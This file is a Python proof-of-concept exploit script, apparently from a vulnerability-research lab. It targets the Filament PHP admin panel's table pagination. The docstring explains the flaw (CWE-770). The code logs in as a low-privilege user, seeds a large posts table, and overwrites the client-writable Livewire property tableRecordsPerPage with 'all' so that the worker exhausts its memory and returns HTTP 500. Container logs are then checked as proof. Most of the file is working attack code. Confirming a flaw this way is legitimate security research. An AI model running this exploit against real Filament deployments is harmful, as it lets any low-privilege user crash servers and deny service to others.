#!/usr/bin/env python3
"""
VULN-006 — Unbounded `tableRecordsPerPage` forces a full-table load (DoS)

Vulnerable code: targets/filament/packages/tables/src/Concerns/CanPaginateRecords.php
  - :16   public $tableRecordsPerPage = null;        (untyped public prop, NOT #[Locked] → client-writable)
  - :63-66 getTableRecordsPerPage(): returns the value verbatim — no clamp / allowlist check
  - :55   paginate(perPage: ($perPage === 'all') ? $total : $perPage)  ('all' ⇒ whole row count as LIMIT)
  - :82   the in_array($option, $pageOptions) allowlist is applied ONLY at mount-time default, never in the getter

Class: CWE-770 Allocation of Resources Without Limits or Throttling (DoS).

The flaw in plain English
-------------------------
The per-page <select> binds to a public Livewire property that Livewire
mass-assigns from the request body, so its value is attacker-chosen regardless of
the options the UI rendered. The live getter returns it verbatim with no upper
bound and no allowlist check, and 'all' is turned into the full row count as the
SQL LIMIT. A single request can therefore make the server hydrate (and render)
every row of a table into Eloquent models.

Exploitation idea
-----------------
On a large table, send one /livewire/update setting tableRecordsPerPage='all'.
The server runs getCountForPagination() then ->paginate(perPage: <total>),
hydrating all rows + rendering them, exhausting the 512M PHP memory_limit → 500.

What a successful run proves
---------------------------
Baseline (perPage=10) returns HTTP 200 in a fraction of a second; the identical
request with perPage='all' on a large table returns HTTP 500 with
"Allowed memory size ... exhausted" in the app log — a single authenticated
request crashes the worker (availability impact, A:H).
"""

import os
import sys
import time
import json
import secrets

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
from lib.livewire import LivewireClient, LivewireError   # noqa: E402
from lib.common import log, banner, verdict              # noqa: E402
from lib import lab                                      # noqa: E402

BASE_URL = os.environ.get("BASE_URL", "http://localhost:21890")
ADMIN_USER = os.environ.get("ADMIN_USER", "ryan@filamentphp.com")  # low-priv, no-MFA seeded user
ADMIN_PASS = os.environ.get("ADMIN_PASS", "password")
TARGET_ROWS = int(os.environ.get("DOS_ROWS", "120000"))            # rows needed to blow 512M
VULN_ID = "VULN-006"
HERE = os.path.dirname(os.path.abspath(__file__))
COMPONENT = "app.filament.resources.post-resource.pages.list-posts"


def main() -> int:
    banner(VULN_ID, "Unbounded tableRecordsPerPage → full-table load (DoS)",
           BASE_URL, "CanPaginateRecords::getTableRecordsPerPage — value returned verbatim, no clamp")

    suffix = secrets.token_hex(4)

    # --- SETUP: a large backing table (so 'all' is catastrophic) --------------
    # The bug exists at any size; a big table makes the memory exhaustion visible.
    have = lab.post_count()
    log("SETUP", f"posts currently in table: {have}")
    if have < TARGET_ROWS:
        log("SETUP", f"bulk-seeding ~{TARGET_ROWS - have} filler posts (generate_series)…")
        total = lab.seed_posts(TARGET_ROWS - have, suffix)
        log("SETUP", f"posts now: {total}")

    # --- SETUP: authenticate as a low-privilege panel user --------------------
    c = LivewireClient(BASE_URL, timeout=120)
    log("SETUP", f"logging in as low-priv user {ADMIN_USER} (any panel user can do this)")
    c.login_admin_panel(ADMIN_USER, ADMIN_PASS)

    # --- BASELINE: a normal page size is cheap --------------------------------
    lp = c.get_component(f"{BASE_URL}/admin/posts", component_name=COMPONENT)
    t = time.time()
    lp.set({"tableRecordsPerPage": 10})
    base_dt = time.time() - t
    log("INFO", f"baseline: perPage=10 → HTTP 200 in {base_dt:.2f}s (one page hydrated)")

    # --- ATTACK: perPage='all' hydrates the entire table ----------------------
    # tableRecordsPerPage is a public property (not #[Locked]); we overwrite it.
    # 'all' is translated by the paginator to the full row count as the LIMIT.
    lp2 = c.get_component(f"{BASE_URL}/admin/posts", component_name=COMPONENT)
    log("STEP", "setting public property tableRecordsPerPage='all' and re-rendering the table")
    t = time.time()
    status = None
    err_excerpt = ""
    try:
        body = lp2.set({"tableRecordsPerPage": "all"})
        atk_dt = time.time() - t
        status = 200
        with open(os.path.join(HERE, "response.txt"), "w") as f:
            f.write(json.dumps(body)[:4000])
        log("INFO", f"attack returned HTTP 200 in {atk_dt:.2f}s (server survived at this size)")
    except LivewireError as e:
        atk_dt = time.time() - t
        err_excerpt = str(e)
        status = 500 if "HTTP 500" in err_excerpt else -1
        with open(os.path.join(HERE, "response.txt"), "w") as f:
            f.write(err_excerpt[:4000])
        log("PROOF", f"attack returned HTTP {status} after {atk_dt:.2f}s — the worker crashed "
                     f"trying to hydrate/render the whole table")

    # --- Corroborate the cause from the app log -------------------------------
    oom = False
    try:
        import subprocess
        logs = subprocess.run(
            ["docker", "compose", "-p", "cvehunterlab_filament", "logs", "app", "--since", "90s"],
            capture_output=True, text=True, timeout=30,
            cwd="/opt/cvehunter/targets/filament/_cvehunter_lab",
        ).stdout
        for line in logs.splitlines():
            if "Allowed memory size" in line and "exhausted" in line:
                oom = True
                log("PROOF", "app log: " + line.split("production.ERROR:")[-1].strip()[:160])
                with open(os.path.join(HERE, "evidence", "oom_log.txt"), "w") as f:
                    f.write(line)
                break
    except Exception as e:  # noqa: BLE001
        log("INFO", f"(could not read container log automatically: {e})")

    if status == 500:
        log("OK", f"exploit confirmed — a single request (perPage='all') crashed the worker "
                  f"with{' an out-of-memory fatal' if oom else ' a 500'}; baseline was {base_dt:.2f}s")
        verdict(VULN_ID, "CONFIRMED",
                "one authenticated request with tableRecordsPerPage='all' exhausts PHP memory "
                "on a large table → worker DoS (A:H)")
        return 0

    log("FAIL", "attack did not crash the worker at this row count; raise DOS_ROWS and re-run")
    verdict(VULN_ID, "NEEDS_MANUAL", "no crash at this size — increase DOS_ROWS")
    return 1


if __name__ == "__main__":
    os.makedirs(os.path.join(HERE, "evidence"), exist_ok=True)
    try:
        sys.exit(main())
    except Exception as e:  # noqa: BLE001
        log("FAIL", f"unexpected error: {e!r}")
        verdict(VULN_ID, "FAILED", f"exception: {e!r}")
        sys.exit(1)
